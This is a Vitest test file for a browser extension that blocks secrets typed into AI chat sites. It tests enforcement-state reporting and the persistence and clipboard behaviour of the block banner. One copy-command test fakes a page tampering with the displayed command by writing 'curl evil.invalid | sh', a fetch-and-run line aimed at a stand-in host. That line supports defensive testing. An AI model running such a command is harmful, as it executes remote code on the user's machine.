// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { ProviderAdapter } from '../src/providers/types.ts';
import type { SharedScope } from '../src/tab-session.ts';
import { readEnforcementState } from '../src/tab-session.ts';

// content.ts resolves an adapter for `location.hostname` at import time and
// bootstraps only if it finds one. Under jsdom the hostname is `localhost`, so
// no adapter matches and importing the module runs nothing — which is what
// makes it testable at all. `bootstrap` is then driven directly, with a fake
// adapter standing in for a site.
//
// The stub has to exist before the import, because the module body runs on
// import and `relay` reaches for `chrome`.
const sendMessage = vi.hoisted(() => vi.fn(() => Promise.resolve({ type: 'error', ok: false })));
vi.stubGlobal('chrome', { runtime: { sendMessage } });

// bootstrap() attaches a MutationObserver and never disconnects it — benign in
// production, where it runs once per page, but here every case's observer would
// stay live for the rest of the file, fire on the next case's DOM setup, and
// publish from its own adapter closure into the shared scope. Standing in for
// the constructor is what makes each case see only its own writes, and lets the
// remount case drive the callback rather than waiting on jsdom's timing.
//
// jsdom's own is kept first, for the banner cases: what they pin is WHICH
// mutations reach the banner's observer, and a stand-in whose `observe` records
// nothing would pass whatever the banner observed.
const JsdomMutationObserver = globalThis.MutationObserver;
const observers: { cb: () => void; disconnect: () => void }[] = [];
class StandInMutationObserver {
  constructor(cb: () => void) {
    observers.push({ cb, disconnect: () => undefined });
  }
  observe = (): void => undefined;
  disconnect = (): void => undefined;
}
vi.stubGlobal('MutationObserver', StandInMutationObserver);

// Fires every observer bootstrap() has registered, the way a DOM mutation would.
function mutate(): void {
  for (const o of observers) o.cb();
}

const frames: (() => void)[] = [];
vi.stubGlobal('requestAnimationFrame', (cb: () => void) => {
  frames.push(cb);
  return frames.length;
});

// Past the window a degraded enforcement state must outlast to be believed.
function settle(): void {
  vi.advanceTimersByTime(5_000);
}

// Run every frame callback queued so far. Synchronous: the rAF stub above just
// collects callbacks, so draining them needs no clock and no await.
function nextFrame(): void {
  const queued = frames.splice(0);
  for (const cb of queued) cb();
}

const { bootstrap, showBanner } = await import('../src/content.ts');

interface Harness {
  adapter: ProviderAdapter;
  bound: () => number;
  unbound: () => number;
}

function fakeAdapter(): Harness {
  let bound = 0;
  let unbound = 0;
  return {
    bound: () => bound,
    unbound: () => unbound,
    adapter: {
      id: 'chatgpt',
      hostnames: ['chatgpt.com'],
      findComposer: () => document.querySelector<HTMLElement>('#composer'),
      findSendButton: () => document.querySelector<HTMLElement>('#send'),
      extractText: () => 'text',
      setText: () => undefined,
      watchSubmit: () => {
        bound += 1;
        return () => {
          unbound += 1;
        };
      },
      submit: () => true,
      endpoints: [],
      requiredPaths: { request: [], response: [] },
      protocolTokens: [],
      parseRequest: () => ({ requiredPathsSeen: false }),
      parseStream: () => ({ push: () => undefined, end: () => null }),
    },
  };
}

describe('bootstrap: what the DOM path reports about itself', () => {
  beforeEach(() => {
    observers.length = 0;
    frames.length = 0;
    // Scoped so this file's rAF stub survives; the frame pump needs it.
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    // A FRESH body per case, not `innerHTML = ''`. bootstrap() attaches a
    // MutationObserver to whatever document.body was and never disconnects it,
    // so every earlier case's observer is still live and still holds its own
    // adapter closure. Clearing the existing body notifies all of them, and
    // they publish over each other in the shared scope — which made one case
    // here pass on a neighbour's write rather than its own.
    document.body = document.createElement('body');
    delete (window as unknown as SharedScope).__akaEnforcement;
    delete (window as unknown as SharedScope).__akaWebSessionId;
    sendMessage.mockClear();
  });

  const scope = (): SharedScope => window as unknown as SharedScope;

  it("publishes 'watching' and binds the watcher when both halves resolve", () => {
    document.body.innerHTML = '<div id="composer"></div><button id="send"></button>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();

    expect(readEnforcementState(scope())).toBe('watching');
    expect(h.bound()).toBe(1);
  });

  it("publishes 'composer-only' and binds NOTHING when the send button is missing", () => {
    // The live signed-in chatgpt.com shape. Binding here would swallow every
    // message, because an intercepted send is completed by clicking that button
    // — so not binding is right, and saying so is the part that was missing.
    document.body.innerHTML = '<div id="composer"></div>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();

    settle();
    expect(readEnforcementState(scope())).toBe('composer-only');
    expect(h.bound()).toBe(0);
  });

  it("publishes 'button-only' when the composer is missing", () => {
    // The anonymous chatgpt.com shape, where the composer is a <textarea> no
    // contenteditable selector reaches.
    document.body.innerHTML = '<button id="send"></button>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();

    settle();
    expect(readEnforcementState(scope())).toBe('button-only');
    expect(h.bound()).toBe(0);
  });

  it("publishes 'unattached' when neither half resolves", () => {
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();

    settle();
    expect(readEnforcementState(scope())).toBe('unattached');
    expect(h.bound()).toBe(0);
  });

  it('republishes when a remount takes the send button away', () => {
    // The regression that matters: a state that only ever moved toward
    // 'watching' would report the healthy moment for the life of the tab.
    document.body.innerHTML = '<div id="composer"></div><button id="send"></button>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    expect(readEnforcementState(scope())).toBe('watching');

    document.querySelector('#send')?.remove();
    mutate();
    nextFrame();
    settle();

    expect(readEnforcementState(scope())).toBe('composer-only');
    expect(h.unbound()).toBe(1);
  });
});

describe('showBanner: the block banner has to survive long enough to act on', () => {
  // Some cases below replace the root element the way a page can; it is put
  // back afterwards so no later case runs in a document one of them rebuilt.
  const originalRoot = document.documentElement;

  beforeEach(() => {
    document.body = document.createElement('body');
    vi.useRealTimers();
    vi.stubGlobal('MutationObserver', JsdomMutationObserver);
  });

  afterEach(() => {
    // A banner carrying an approve command neither auto-hides nor lets go of
    // the document, so it would outlive its case and be put back into the next
    // case's body. Dismissed here the way a user would close it.
    [...(lastShadow?.querySelectorAll('button') ?? [])]
      .find((b) => b.textContent === 'Dismiss')
      ?.click();
    lastShadow = null;
    if (document.documentElement !== originalRoot) {
      document.replaceChild(originalRoot, document.documentElement);
    }
    vi.stubGlobal('MutationObserver', StandInMutationObserver);
  });

  // jsdom queues mutation records on a microtask, so the banner's observer runs
  // only once a case yields.
  async function deliverMutations(): Promise<void> {
    await Promise.resolve();
    await Promise.resolve();
  }

  // The root showBanner rendered into. A closed root is reachable from
  // nowhere else — `document.body.firstElementChild?.shadowRoot` is null, for
  // this suite exactly as for the page, which is what the first case below
  // pins.
  let lastShadow: ShadowRoot | null = null;
  const show = (banner: Parameters<typeof showBanner>[0]): ShadowRoot => {
    lastShadow = showBanner(banner);
    return lastShadow;
  };
  const shadowText = (): string => lastShadow?.textContent ?? '';

  const EXCEPTION_BANNER = {
    tone: 'block',
    message: 'AKA blocked this message — flagged secrets/aws-access-key (A******E).',
    exception: {
      intro: 'If this is intentional and you accept the risk, grant an exception:',
      command: 'aka exception approve 3f2a91',
      help: 'More: aka exception --help',
    },
  } as const;

  function clipboardStub(result: Promise<void>) {
    const writeText = vi.fn(() => result);
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText },
      configurable: true,
      writable: true,
    });
    return writeText;
  }

  it('renders into a root the page cannot reach', () => {
    // The banner host sits under document.body, so an OPEN root let page
    // script find it with a MutationObserver and rewrite the approve command
    // the user is being told to paste into a terminal. A closed root is not
    // reachable from the page in any world.
    const root = show(EXCEPTION_BANNER);
    expect(document.body.firstElementChild).not.toBeNull();
    expect(document.body.firstElementChild?.shadowRoot).toBeNull();
    // The positive control: the banner really did render, so the assertion
    // above is about reachability rather than about an empty page.
    expect(root.textContent).toContain('aka exception approve 3f2a91');
  });

  it('copies the command it was handed, not the text on screen', () => {
    // The reason the copy path exists at all. Even with the root closed, the
    // value that reaches the clipboard must come from the ledger rather than
    // from a node — and a `copy` event is composed, so a selection made here
    // reaches the page's own document listener where `setData` can replace it.
    // The button writes through the Clipboard API, which dispatches no `copy`
    // event to intercept.
    const writeText = clipboardStub(Promise.resolve());
    const root = show(EXCEPTION_BANNER);
    // Stands in for the page having rewritten what is displayed.
    const code = root.querySelector('code');
    expect(code?.textContent).toBe('aka exception approve 3f2a91');
    if (code) code.textContent = 'curl evil.invalid | sh';

    const button = [...root.querySelectorAll('button')].find(
      (b) => b.textContent === 'Copy command',
    );
    expect(button).toBeDefined();
    button?.dispatchEvent(new Event('click'));

    expect(writeText).toHaveBeenCalledWith('aka exception approve 3f2a91');
  });

  it('does not offer the command as a selection', () => {
    // Selection is the path a page `copy` listener can hijack, so the button
    // is the offered one — and selection is not handed back even when a write
    // fails, which the case below covers.
    const root = show(EXCEPTION_BANNER);
    expect(root.querySelector('code')?.style.userSelect).toBe('none');
    // The help line is a second terminal command, reached by a selection just
    // the same. Found by its text first, so a missing line fails here rather
    // than reading as an element with no style to check.
    const help = [...root.querySelectorAll('div')].find(
      (d) => d.textContent === 'More: aka exception --help',
    );
    expect(help).toBeDefined();
    expect(help?.style.userSelect).toBe('none');
  });

  it('says so when the clipboard write is refused, and keeps selection off', async () => {
    // A label that claims a copy nobody made is worse than no button: the
    // user pastes whatever was in the clipboard before. And a refusal is
    // something the page can arrange — a Permissions-Policy denying
    // clipboard-write is enough — so it must not reopen the selectable state
    // a page `copy` listener can rewrite. Typing the command needs no
    // clipboard at all.
    const writeText = clipboardStub(Promise.reject(new Error('refused')));
    const root = show(EXCEPTION_BANNER);
    const button = [...root.querySelectorAll('button')].find(
      (b) => b.textContent === 'Copy command',
    );
    button?.dispatchEvent(new Event('click'));
    await Promise.resolve();
    await Promise.resolve();

    expect(writeText).toHaveBeenCalledOnce();
    // The positive control: the label changed, so the rejection path is the
    // one that ran when the selection below was read.
    expect(button?.textContent).toBe('Copy failed — type the approve command into a terminal');
    expect(root.querySelector('code')?.style.userSelect).toBe('none');
  });

  it('renders the approve command as its own element, not buried in the prose', () => {
    // Its own node so the command is a label the copy button names, rather
    // than a fragment of a sentence.
    show({
      tone: 'block',
      message: 'AKA blocked this message — flagged secrets/aws-access-key (A******E).',
      exception: {
        intro: 'If this is intentional and you accept the risk, grant an exception:',
        command: 'aka exception approve 3f2a91',
        help: 'More: aka exception --help',
      },
    });
    const nodes = [...(lastShadow?.querySelectorAll('*') ?? [])];
    expect(nodes.some((n) => n.textContent === 'aka exception approve 3f2a91')).toBe(true);
  });

  it('keeps a block banner on screen past the auto-hide window', () => {
    vi.useFakeTimers();
    show({
      tone: 'block',
      message: 'AKA blocked this message.',
      exception: { intro: 'i', command: 'aka exception approve 3f2a91', help: 'h' },
    });
    vi.advanceTimersByTime(60_000);

    // The HOST's presence is the property. Two things made the text read
    // vacuous: this called `showBanner` directly, so `shadowText()` returned
    // whichever root an earlier case left in `lastShadow`; and even routed
    // through `show`, `bannerHost.remove()` only detaches the host — the
    // closed root keeps its children, so its `textContent` survives a banner
    // that is no longer on screen. Checked by mutation: arming the hide timer
    // for every banner left this case green on the text alone.
    expect(document.body.firstElementChild).not.toBeNull();
    // Kept as the positive control: the right banner is the one still up.
    expect(shadowText()).toContain('aka exception approve 3f2a91');
  });

  it('still auto-hides a warn banner, which carries nothing to act on', () => {
    vi.useFakeTimers();
    show({ tone: 'warn', message: 'AKA flagged sensitive content — sent unchanged.' });
    expect(shadowText()).toContain('flagged sensitive content');
    vi.advanceTimersByTime(10_000);
    expect(document.body.firstElementChild).toBeNull();
  });

  it('gives a persistent banner a way to be dismissed', () => {
    // A banner that never leaves and cannot be closed is worse than one that
    // fades: it covers the composer the user was told to go and edit.
    vi.useFakeTimers();
    const root = show({
      tone: 'block',
      message: 'AKA blocked this message.',
      exception: { intro: 'i', command: 'aka exception approve 3f2a91', help: 'h' },
    });
    // By its label rather than by position: the copy button shares this row,
    // and an index would silently start clicking that one instead.
    const dismiss = [...root.querySelectorAll('button')].find((b) => b.textContent === 'Dismiss');
    expect(dismiss).toBeDefined();
    dismiss?.click();
    expect(document.body.firstElementChild).toBeNull();
  });

  it('puts an approve banner back when the page removes it before it is dismissed', async () => {
    // The banner stays up because its command is the only on-screen route to
    // the exception, and showBanner re-creates a detached host only on its
    // NEXT call — so a re-render that drops the host would otherwise take the
    // route with it until something else is blocked.
    show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    expect(host).not.toBeNull();
    host?.remove();
    // The removal really took it out, so the reconnection below is the
    // observer's work rather than a removal that never happened.
    expect(host?.isConnected).toBe(false);

    await deliverMutations();

    expect(host?.isConnected).toBe(true);
    expect(document.body.firstElementChild).toBe(host);
    expect(shadowText()).toContain('aka exception approve 3f2a91');
  });

  it('keeps holding it when the page replaces the whole body', async () => {
    // A replacement body is a node the banner's first observation never
    // covered, so a removal from it is only seen if the observer moved along.
    show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    document.body = document.createElement('body');
    expect(host?.isConnected).toBe(false);
    await deliverMutations();
    expect(host?.parentNode).toBe(document.body);

    host?.remove();
    expect(host?.isConnected).toBe(false);
    await deliverMutations();
    expect(host?.parentNode).toBe(document.body);
  });

  it('lets a dismissed banner stay gone, whatever the page does next', async () => {
    // The reattach cases above are the positive control: with the same
    // delivery, a banner still held comes back. Once dismissed it must not.
    const root = show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    expect(host).not.toBeNull();
    const dismiss = [...root.querySelectorAll('button')].find((b) => b.textContent === 'Dismiss');
    expect(dismiss).toBeDefined();
    dismiss?.click();
    // The page carries on re-rendering after the user closed it.
    const churn = document.createElement('div');
    document.body.append(churn);
    churn.remove();
    await deliverMutations();

    expect(host?.isConnected).toBe(false);
    expect(document.body.firstElementChild).toBeNull();
  });

  it('lets go once a banner that auto-hides replaces the approve banner', async () => {
    // Fake timeouts so the warn banner's hide timer cannot fire into a later
    // case; nothing here advances them.
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    show(EXCEPTION_BANNER);
    show({ tone: 'warn', message: 'AKA flagged sensitive content — sent unchanged.' });
    const host = document.body.firstElementChild;
    // The same host now shows the warn banner, so what is being let go is the
    // hold rather than a banner nobody replaced.
    expect(shadowText()).toContain('flagged sensitive content');
    host?.remove();
    await deliverMutations();

    expect(host?.isConnected).toBe(false);
  });

  it('lets go of a banner the page removes every time it comes back', async () => {
    // A page observer that takes the host out whenever it returns trades
    // mutations with the banner's observer on the microtask queue. Unbounded,
    // that exchange never ends and the tab never gets its event loop back, so
    // the hold gives up after a fixed number of returns within one burst (20,
    // in content.ts). The exchange never yields to a task, so nothing resets
    // the count while it lasts.
    show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    expect(host).not.toBeNull();
    let returns = 0;
    const page = new JsdomMutationObserver(() => {
      if (host?.parentNode === document.body) {
        returns += 1;
        host.remove();
      }
    });
    page.observe(document.body, { childList: true });

    host?.remove();
    for (let turn = 0; turn < 10; turn += 1) await deliverMutations();
    page.disconnect();

    // The positive control: the banner really was put back more than once, so
    // the two observers did trade removals before the hold let go.
    expect(returns).toBeGreaterThan(1);
    expect(returns).toBeLessThanOrEqual(20);
    expect(host?.isConnected).toBe(false);
  });

  it('keeps putting it back when the removals are a task apart', async () => {
    // The limit bounds one uninterrupted exchange, not the banner's lifetime: a
    // page whose re-renders drop the host now and then must not use it up.
    // More removals than the limit (20, in content.ts), each a task after the
    // last.
    show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    expect(host).not.toBeNull();
    for (let removal = 0; removal < 25; removal += 1) {
      host?.remove();
      // The removal really took it out, so each return is the observer's work.
      expect(host?.isConnected).toBe(false);
      await deliverMutations();
      expect(host?.isConnected).toBe(true);
      await new Promise((resolve) => setTimeout(resolve, 0));
    }
  });

  it('keeps holding it when the page replaces the root element', async () => {
    // `document.replaceChild` takes body, and the host in it, out of the
    // document in one mutation, recorded on the document rather than on body
    // or on the root element.
    show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    const root = document.createElement('html');
    root.append(document.createElement('body'));
    document.replaceChild(root, document.documentElement);
    expect(host?.isConnected).toBe(false);
    await deliverMutations();
    expect(document.documentElement).toBe(root);
    expect(host?.parentNode).toBe(document.body);

    // A body replaced inside the new root is recorded on that root, so it is
    // only seen if the observation moved there.
    document.body = document.createElement('body');
    expect(host?.isConnected).toBe(false);
    await deliverMutations();
    expect(host?.parentNode).toBe(document.body);
  });

  it('keeps holding it when the page moves it into a body of its own', async () => {
    // A replacement body that already holds the host needs nothing put back,
    // but it is still a node no earlier observation covers — so the hold has
    // to move to it anyway, or a later removal from it goes unseen.
    show(EXCEPTION_BANNER);
    const host = document.body.firstElementChild;
    expect(host).not.toBeNull();
    const body = document.createElement('body');
    if (host) body.append(host);
    document.body = body;
    await deliverMutations();
    expect(host?.parentNode).toBe(body);

    host?.remove();
    expect(host?.isConnected).toBe(false);
    await deliverMutations();
    expect(host?.parentNode).toBe(document.body);
  });

  it('waits for a body when the page removes it with none to replace it', async () => {
    // With no body there is nowhere to put the host. That must neither throw
    // out of the observer nor spend the re-attach limit while the page goes on
    // re-rendering, or the body that comes back finds the hold already gone.
    const errors: unknown[] = [];
    const onError = (event: ErrorEvent): void => {
      errors.push(event.error);
      event.preventDefault();
    };
    window.addEventListener('error', onError);
    try {
      // The positive control for the absence at the end: a throw out of an
      // observer callback does reach this listener.
      const thrower = new JsdomMutationObserver(() => {
        throw new Error('observer threw');
      });
      const probe = document.createElement('div');
      thrower.observe(probe, { childList: true });
      probe.append(document.createElement('span'));
      await deliverMutations();
      thrower.disconnect();
      expect(errors).toHaveLength(1);
      errors.length = 0;

      show(EXCEPTION_BANNER);
      const host = document.body.firstElementChild;
      expect(host).not.toBeNull();
      document.body.remove();
      expect(document.body).toBeNull();
      // More re-renders than the limit (20, in content.ts), all in one burst,
      // while there is no body.
      for (let render = 0; render < 25; render += 1) {
        const node = document.createComment('render');
        document.documentElement.append(node);
        await deliverMutations();
        node.remove();
        await deliverMutations();
      }
      expect(host?.isConnected).toBe(false);

      document.documentElement.append(document.createElement('body'));
      await deliverMutations();

      expect(host?.parentNode).toBe(document.body);
      expect(errors).toEqual([]);
    } finally {
      window.removeEventListener('error', onError);
    }
  });

  it('lets a stale banner close only itself', async () => {
    // Two hosts share the document once the page puts back a host it removed
    // after a later banner created a new one. Dismiss on the stale one must not
    // reach the current banner, or the approve route the user still needs goes
    // with it and stays gone.
    const staleRoot = show(EXCEPTION_BANNER);
    const stale = document.body.firstElementChild;
    expect(stale).not.toBeNull();
    stale?.remove();
    // Shown before that removal is delivered, so this banner gets a host of its
    // own rather than the stale one put back.
    show(EXCEPTION_BANNER);
    const current = document.body.firstElementChild;
    expect(current).not.toBeNull();
    expect(current).not.toBe(stale);
    if (stale) document.body.append(stale);
    await deliverMutations();
    expect(stale?.isConnected).toBe(true);

    const staleDismiss = [...staleRoot.querySelectorAll('button')].find(
      (b) => b.textContent === 'Dismiss',
    );
    expect(staleDismiss).toBeDefined();
    staleDismiss?.click();

    expect(stale?.isConnected).toBe(false);
    // The positive control: the current banner is still in the document, and
    // still held.
    expect(current?.isConnected).toBe(true);
    current?.remove();
    expect(current?.isConnected).toBe(false);
    await deliverMutations();
    expect(current?.parentNode).toBe(document.body);
  });
});

describe('a degraded enforcement state has to settle before it is believed', () => {
  beforeEach(() => {
    observers.length = 0;
    frames.length = 0;
    document.body = document.createElement('body');
    delete (window as unknown as SharedScope).__akaEnforcement;
    delete (window as unknown as SharedScope).__akaWebSessionId;
    // Only the timeout family. Faking requestAnimationFrame too would replace
    // this file's own rAF stub, and the frame pump would never run.
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
  });

  const scope = (): SharedScope => window as unknown as SharedScope;

  it('publishes nothing but watching when a mount passes through a half-resolved state', () => {
    // The live shape: a page load reports button-only for a moment, then
    // watching once the composer mounts. Publishing the intermediate puts a
    // red "not enforcing" row in the store and a warning in the popup for a
    // tab that is perfectly healthy — on every page load, on every tab.
    document.body.innerHTML = '<button id="send"></button>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    expect(readEnforcementState(scope())).toBe('unknown');

    document.body.innerHTML = '<div id="composer"></div><button id="send"></button>';
    mutate();
    nextFrame();

    expect(readEnforcementState(scope())).toBe('watching');
    vi.advanceTimersByTime(30_000);
    expect(readEnforcementState(scope())).toBe('watching');
  });

  it('publishes watching immediately — a bound watcher is not provisional', () => {
    document.body.innerHTML = '<div id="composer"></div><button id="send"></button>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    expect(readEnforcementState(scope())).toBe('watching');
  });

  it('holds a degraded state back for the whole window, not merely one tick', () => {
    // Without a SHORT advance this suite cannot tell a 2s settle from a 0ms
    // one: every other case either checks before any timer runs or advances
    // far past the window, and both readings are identical either way. A zero
    // window republishes every transient mount state, which is the noise the
    // settle exists to remove — so the lower bound is the property, and this
    // is the only case that holds it.
    document.body.innerHTML = '<div id="composer"></div>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();

    vi.advanceTimersByTime(1_500);
    expect(readEnforcementState(scope())).toBe('unknown');

    vi.advanceTimersByTime(1_000);
    expect(readEnforcementState(scope())).toBe('composer-only');
  });

  it('publishes a degraded state that persists past the settle window', () => {
    document.body.innerHTML = '<div id="composer"></div>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    expect(readEnforcementState(scope())).toBe('unknown');

    vi.advanceTimersByTime(30_000);
    expect(readEnforcementState(scope())).toBe('composer-only');
  });

  it('still reports a watcher that dies mid-session, once it has settled', () => {
    // The regression direction matters as much as the mount direction: a
    // composer whose send button goes away for good must not stay 'watching'.
    document.body.innerHTML = '<div id="composer"></div><button id="send"></button>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    expect(readEnforcementState(scope())).toBe('watching');

    document.querySelector('#send')?.remove();
    mutate();
    nextFrame();
    vi.advanceTimersByTime(30_000);

    expect(readEnforcementState(scope())).toBe('composer-only');
  });

  it('cancels a pending state when the page returns to the one already published', () => {
    // Settled at `composer-only`, one pass reads `unattached` and starts the
    // wait, and the next pass reads `composer-only` again. The combined early
    // return this replaced left that timer running, so the window later
    // published `unattached` for a tab that had been back at `composer-only`
    // throughout — and nothing re-reports until the DOM mutates again, so the
    // popup could show that reason indefinitely.
    document.body.innerHTML = '<div id="composer"></div>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    vi.advanceTimersByTime(30_000);
    expect(readEnforcementState(scope())).toBe('composer-only');

    // The flicker: for one pass neither half resolves.
    document.body.innerHTML = '';
    mutate();
    nextFrame();
    // Half the window, so the pending publish is still ahead of us — without
    // it this case would pass on a fix that merely made the timer fire sooner.
    vi.advanceTimersByTime(1_000);

    // And back to the state that was already published.
    document.body.innerHTML = '<div id="composer"></div>';
    mutate();
    nextFrame();
    vi.advanceTimersByTime(30_000);

    expect(readEnforcementState(scope())).toBe('composer-only');
  });

  it('a repeating degraded state is not deferred for ever by the churn that repeats it', () => {
    // reattach runs on every DOM mutation, and these sites mutate constantly.
    // Resetting the timer on each identical report would mean a genuinely
    // broken page never reports at all.
    document.body.innerHTML = '<div id="composer"></div>';
    const h = fakeAdapter();
    bootstrap(h.adapter);
    nextFrame();
    for (let i = 0; i < 20; i += 1) {
      vi.advanceTimersByTime(500);
      mutate();
      nextFrame();
    }
    expect(readEnforcementState(scope())).toBe('composer-only');
  });
});
